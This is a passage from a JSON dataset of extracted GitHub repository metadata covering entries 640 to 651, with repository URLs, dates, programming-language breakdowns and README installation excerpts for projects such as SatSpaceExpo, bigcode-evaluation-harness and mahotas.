                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 46242
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Objective-C++",
                    "name": "Objective-C++",
                    "type": "Programming_language",
                    "size": 39764
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 7244
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 5117
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 4571
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Objective-C",
                    "name": "Objective-C",
                    "type": "Programming_language",
                    "size": 3842
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Verilog",
                    "name": "Verilog",
                    "type": "Programming_language",
                    "size": 2837
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 2102
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Tcl",
                    "name": "Tcl",
                    "type": "Programming_language",
                    "size": 1182
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "640": {
        "filename": "i-se_SatSpaceExpo_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ai-se/SatSpaceExpo",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We used [Z3 v4.8.4](https://github.com/Z3Prover/z3/releases/tag/z3-4.8.4) during the experiment, but newer version could be probably faster.\n```\nwget https://github.com/Z3Prover/z3/archive/z3-4.8.4.tar.gz\ntar -xzf z3-4.8.4.tar.gz\n# follow steps in README.md inside the z3-4.8.4 like following...\npython scripts/mk_make.py\ncd build\nmake\nsudo make install\n```",
                    "type": "Text_excerpt",
                    "original_header": "Step 1. Download and set up Z3 solvers",
                    "parent_header": [
                        "SNAP for building very small test suites",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ai-se/SatSpaceExpo/master/README.md"
            },
            {
                "result": {
                    "value": "In the SNAP, for convenient, we use the ID to represent the benchmarks,  you can also replace or add more test cases by editing the `src/commons/utility/utility.h`.\nBe default, the id shows as \n```\nstatic std::vector<std::string> benchmark_models{\n    \"Benchmarks/Blasted_Real/blasted_case47.cnf\", // 0\n    \"Benchmarks/Blasted_Real/blasted_case110.cnf\", // 1\n    \"Benchmarks/V7/s820a_7_4.cnf\", // 2\n    \"Benchmarks/V15/s820a_15_7.cnf\", // 3\n    \"Benchmarks/V3/s1238a_3_2.cnf\", // 4\n    \"Benchmarks/V3/s1196a_3_2.cnf\", // 5\n    \"Benchmarks/V15/s832a_15_7.cnf\", // 6\n    \"Benchmarks/Blasted_Real/blasted_case_1_b12_2.cnf\", // 7\n    \"Benchmarks/Blasted_Real/blasted_squaring16.cnf\", // 8\n    \"Benchmarks/Blasted_Real/blasted_squaring7.cnf\", // 9\n    \"Benchmarks/70.sk_3_40.cnf\", // 10\n    \"Benchmarks/ProcessBean.sk_8_64.cnf\", // 11\n    \"Benchmarks/56.sk_6_38.cnf\", // 12\n    \"Benchmarks/35.sk_3_52.cnf\", // 13\n    \"Benchmarks/80.sk_2_48.cnf\", // 14\n    \"Benchmarks/7.sk_4_50.cnf\", // 15\n    \"Benchmarks/doublyLinkedList.sk_8_37.cnf\", // 16\n    \"Benchmarks/19.sk_3_48.cnf\", // 17\n    \"Benchmarks/29.sk_3_45.cnf\", // 18\n    \"Benchmarks/isolateRightmost.sk_7_481.cnf\", //19\n    \"Benchmarks/17.sk_3_45.cnf\", // 20\n    \"Benchmarks/81.sk_5_51.cnf\", // 21\n    \"Benchmarks/LoginService2.sk_23_36.cnf\", // 22\n    \"Benchmarks/sort.sk_8_52.cnf\", // 23\n    \"Benchmarks/parity.sk_11_11.cnf\", // 24\n    \"Benchmarks/77.sk_3_44.cnf\", // 25\n    \"Benchmarks/20.sk_1_51.cnf\", // 26\n    \"Benchmarks/enqueueSeqSK.sk_10_42.cnf\", // 27\n    \"Benchmarks/karatsuba.sk_7_41.cnf\", // 28\n    \"Benchmarks/tutorial3.sk_4_31.cnf\" // 29\n};\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 4. Understanding the Benchmark ID",
                    "parent_header": [
                        "SNAP for building very small test suites",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ai-se/SatSpaceExpo/master/README.md"
            },
            {
                "result": {
                    "value": "```\ncd /path/to/SatSpaceExpo\nmake snap\n/path/to/SatSpaceExpo/bin/snap -i ID@Step4\n\n# To clean up all compiled binaries\ncd /path/to/SatSpaceExpo\nmake clean\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 5. Compile SNAP and execution",
                    "parent_header": [
                        "SNAP for building very small test suites",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ai-se/SatSpaceExpo/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-01-28T14:44:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-11-18T09:20:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 14162865
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 1116034
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 148813
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Assembly",
                    "name": "Assembly",
                    "type": "Programming_language",
                    "size": 141281
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ada",
                    "name": "Ada",
                    "type": "Programming_language",
                    "size": 89079
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Pascal",
                    "name": "Pascal",
                    "type": "Programming_language",
                    "size": 75208
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 55627
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 44252
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 29824
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "DIGITAL Command Language",
                    "name": "DIGITAL Command Language",
                    "type": "Programming_language",
                    "size": 27303
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Objective-C",
                    "name": "Objective-C",
                    "type": "Programming_language",
                    "size": 21403
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 18594
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 10727
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 8099
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 7800
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 3895
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SAS",
                    "name": "SAS",
                    "type": "Programming_language",
                    "size": 1847
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Module Management System",
                    "name": "Module Management System",
                    "type": "Programming_language",
                    "size": 1545
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "M4",
                    "name": "M4",
                    "type": "Programming_language",
                    "size": 787
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 178
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "641": {
        "filename": "HadiJahanshahi_Bug-Number-Prediction_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/HadiJahanshahi/Bug-Number-Prediction",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "  * Python 3.7.1\n \nAlso, the following Python Libraries are needed:\n  \n  * pandas\n  * numpy\n  * matplotlib\n  * scipy\n  * sklearn\n  * statsmodels\n  * keras\n  * plotly\n  * pmdarima\n   \n",
                    "original_header": "Required tools and packages"
                },
                "confidence": 0.9999768578711264,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/HadiJahanshahi/Bug-Number-Prediction/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-03-10T22:05:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-05-24T04:29:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 4440148
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "642": {
        "filename": "bigcode-project_bigcode-evaluation-harness_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bigcode-project/bigcode-evaluation-harness",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "More details about each task can be found in  the documentation in [`docs/README.md`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/docs/README.md).\n## Setup\n```bash\ngit clone https://github.com/bigcode-project/bigcode-evaluation-harness.git\ncd bigcode-evaluation-harness\n```\nInstall [`torch`](https://pytorch.org/get-started/locally/) based on your device type, and install the other packages using:\nBASH2*\nTo run the `DS-1000` benchmark, additional constraints must be resolved.\nBASH3*\nAlso make sure you have `git-lfs` installed and are logged in the Hub\nBASH4*`\nWe use [`accelerate`](https://huggingface.co/docs/accelerate/index) to generate code/text in parallel when multiple GPUs are present (multi-GPU mode). You can configure it using:\n```bash\naccelerate config\n```\n \n"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bigcode-project/bigcode-evaluation-harness/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you want to generate solutions without executing and evaluating the code, call `--generation_only`, in addition to the instructions above. This will save the solutions in a json file provided in `save_generation_path` in the working directory.  \n",
                    "original_header": "Generation only"
                },
                "confidence": 0.9977958773735992,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bigcode-project/bigcode-evaluation-harness/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you already have the generations in a json file from this evaluation harness and want to evaluate them, specify the path of the generations via the `load_generations_path` argument. You may need to reconfigure `accelerate` to use multiple CPUs. \n",
                    "original_header": "Evaluation only"
                },
                "confidence": 0.9999727495041103,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bigcode-project/bigcode-evaluation-harness/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you want to evaluate on MultiPL-E, we have a different Dockerfile since it requires more dependencies, use:\n```bash\n$ docker pull ghcr.io/bigcode-project/evaluation-harness-multiple\n$ docker tag ghcr.io/bigcode-project/evaluation-harness-multiple evaluation-harness-multiple\n``` \n",
                    "original_header": "Docker containers"
                },
                "confidence": 0.9947986444615703,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bigcode-project/bigcode-evaluation-harness/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you modify the evaluation harness, you may want to rebuild the docker images. \n",
                    "original_header": "Building  Docker images"
                },
                "confidence": 0.9362523676994922,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bigcode-project/bigcode-evaluation-harness/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-09T12:58:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T23:55:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 341090
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1902
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 631
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 226
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "643": {
        "filename": "tum-i22_rritbed_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tum-i4/rritbed",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-05-02T06:23:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-13T18:13:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 268247
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 13572
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 258
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "644": {
        "filename": "SerVal-DTF_APR-Efficiency_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/TruX-DTF/APR-Efficiency",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "=========\n> ACS and SimFix are available at: https://drive.google.com/drive/folders/1OS9-GG2WQjFpvOPARaLW-k9b-9ZpO_3J?usp=sharing \n> kPAR: https://github.com/SerVal-DTF/FL-VS-APR/tree/master/kPAR \n> AVATAR: https://github.com/SerVal-DTF/AVATAR \n> TBar: https://github.com/SerVal-DTF/TBar\n \n",
                    "original_header": "APR tools"
                },
                "confidence": 0.9953572331944254,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SerVal-DTF/APR-Efficiency/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "> **FixMiner:** [Chart-1], [Chart-4], [Math-22], [Math-30], [Math-34], [Math-57], [Math-70], [Math-75], [Math-79]; \n> **jGenProg:** [Math-5], [Math-53], [Math-70]; \n> **SimFix:** [Chart-1], [Chart-7], [Chart-20], [Closure-14], [Closure-57], [Closure-62], [Closure-63], [Closure-73], [Lang-33], [Lang-43], [Lang-58], [Lang-60], [Math-5], [Math-41], [Math-53], [Math-57], [Math-59], [Math-70], [Math-(71)], [Math-75], [Math-79]; \n",
                    "original_header": "R0: Identical Patch"
                },
                "confidence": 0.9790979332509089,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SerVal-DTF/APR-Efficiency/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-25T03:36:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-30T07:58:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "645": {
        "filename": "sharmapn_influenceOfRoles_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sharmapn/influenceOfRoles",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-04-23T04:50:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-06T04:54:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "646": {
        "filename": "YuanruiZJU_academic-ai-repos_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/YuanruiZJU/academic-ai-repos",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In the `code_repos` directory, we provide all the academic AI repositories studied in our paper. Input the following commands to retrieve all the repositories:\n```\ngit clone https://github.com/YuanruiZJU/academic-ai-repos.git\ngit submodule init\ngit submodule update\n```\n \n",
                    "original_header": "Data"
                },
                "confidence": 0.9999999999601812,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/YuanruiZJU/academic-ai-repos/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-07-02T05:38:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-12-25T15:56:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 248409
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 46463
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 35908
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 23460
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "647": {
        "filename": "lmous_openai-gpt4-coding-assistant_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lmous/openai-gpt4-coding-assistant",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-09-16T08:10:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-16T08:10:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "648": {
        "filename": "PrivacyEngineering_hawk-sockshop_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/PrivacyEngineering/hawk-sockshop",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "_We provide a [Helm](#helm-deployment-on-a-minikube-host) installation instruction as a default deployment example._ \n_Additionally we provide with legacy installation examples for [terraform](DEPLOYMENT.md#terraform-install) and [kubernetes](DEPLOYMENT.md#kubernetes-install) that you can adapt to your liking._\n \n",
                    "original_header": "Overview"
                },
                "confidence": 0.9666521764922336,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/PrivacyEngineering/hawk-sockshop/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-02-13T12:58:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-03-18T09:28:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HCL",
                    "name": "HCL",
                    "type": "Programming_language",
                    "size": 8734
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "649": {
        "filename": "jianguda_mrncs_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jianguda/mrncs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```markdown\n**code** implementations to support the experiments\n----**build** the tree-sitter code parser\n----**tree** the code package of the implementations\n----**vendor** the Git submodules for build the code parser\n**resources** raw data and preprocessed data\n----**cache** preprocessed data\n----**data** raw data\n**doc** documentations\n----**exp** experimental results\n----**info** supplementary snippets\n----`@guide.md` guidance for run experiments\n```\n \n",
                    "original_header": "Repo Structure"
                },
                "confidence": 0.9999873306357413,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jianguda/mrncs/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-02-12T23:03:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-22T12:18:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 129499
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "650": {
        "filename": "YintongHuo_SemParser_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/YintongHuo/SemParser",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-02-04T15:04:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-12T04:59:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 76636
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "651": {
        "filename": "uispedro_mahotas_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/luispedro/mahotas",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "If you are using [conda](https://anaconda.org/), you can install mahotas from\n[conda-forge](https://conda-forge.github.io/) using the following commands:\n\n```bash\nconda config --add channels conda-forge\nconda install mahotas\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "Mahotas"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "value": "You will need python (naturally), numpy, and a C++ compiler. Then you\nshould be able to use:\n\n```bash\npip install mahotas\n```\n\nYou can test your installation by running:\n\n```bash\npython -c \"import mahotas as mh; mh.test()\"\n```\n\nIf you run into issues, the manual has more [extensive documentation on\nmahotas\ninstallation](https://mahotas.readthedocs.io/en/latest/install.html),\nincluding how to find pre-built for several platforms.\n",
                    "type": "Text_excerpt",
                    "original_header": "Compilation from source",
                    "parent_header": [
                        "Mahotas",
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can set the `DEBUG` environment variable before compilation to get a\ndebug version:\n```bash\nexport DEBUG=1\npython setup.py test\n```\nYou can set it to the value `2` to get extra checks:\n```bash\nexport DEBUG=2\npython setup.py test\n```\n \nThe `Makefile` that is shipped with the source of mahotas can be useful\ntoo. `make debug` will create a debug build. `make fast` will create a\nnon-debug build (you need to `make clean` in between). `make test` will\nrun the test suite.\n \n",
                    "original_header": "Development"
                },
                "confidence": 0.9999768446398865,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix bug in Haralick features and NumPy 2 (thanks to @Czaki, see [#150](https://github.com/luispedro/mahotas/pull/150))\n \n",
                    "original_header": "Version 1.4.18 (Jul 18 2024)"
                },
                "confidence": 0.915729940183164,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix bug that stopped mahotas from working on Windows\n \n",
                    "original_header": "Version 1.4.17 (Jul 13 2024)"
                },
                "confidence": 0.995878487819367,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- update for NumPy 2\n- Add deprecated warning for freeimage \n",
                    "original_header": "Version 1.4.16 (Jul 3 2024)"
                },
                "confidence": 0.99377000300729,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Update build system (thanks to @Czaki, see #147)\n \n",
                    "original_header": "Version 1.4.15 (Mar 24 2024)"
                },
                "confidence": 0.9920526737135964,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix code for C++17 (issue #146) \n",
                    "original_header": "Version 1.4.14 (Mar 24 2024)"
                },
                "confidence": 0.9328260784441005,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix freeimage testing (and make freeimage loading more robust, see #129)\n- Add GIL fixed (which triggered crashes in newer NumPy versions)\n \n",
                    "original_header": "Version 1.4.13 (Jun 28 2022)"
                },
                "confidence": 0.9999458699420978,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Update to newer NumPy\n- Build wheels for Python 3.9 & 3.10\n \n",
                    "original_header": "Version 1.4.12 (Oct 14 2021)"
                },
                "confidence": 0.999970123030918,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Build wheels automatically (PR #114 by [nathanhillyer](https://github.com/nathanhillyer))\n \n",
                    "original_header": "Version 1.4.10 (Jun 11 2020)"
                },
                "confidence": 0.9963411445665138,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix compilation on Windows\n \n",
                    "original_header": "Version 1.4.7 (Jul 10 2019)"
                },
                "confidence": 0.9754926039619221,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Upgrade code to newer NumPy API (issue #95)\n \n",
                    "original_header": "Version 1.4.5 (Oct 20 2018)"
                },
                "confidence": 0.9984512185882864,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Fix bug in Bernsen thresholding (issue #84)\n \n",
                    "original_header": "Version 1.4.4 (Nov 5 2017)"
                },
                "confidence": 0.9212411613482554,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/luispedro/mahotas/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
